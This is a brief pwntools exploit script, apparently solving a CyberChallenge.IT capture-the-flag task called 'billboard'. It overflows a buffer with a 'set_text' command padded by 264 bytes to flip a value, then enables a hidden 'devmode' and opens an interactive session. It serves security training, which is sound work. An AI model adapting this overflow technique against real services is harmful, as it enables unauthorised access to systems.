from pwn import *

context.arch = 'amd64'
if args.REMOTE:
     conn = remote('billboard.challs.cyberchallenge.it', 9120)
else:
     conn = process('./server')
     

payload = b'set_text '       
payload += b'A' * 264       
payload += b'1'        

conn.recvuntil(b'>')
conn.sendline(payload)
conn.sendlineafter(b'>', b'devmode')
conn.interactive()
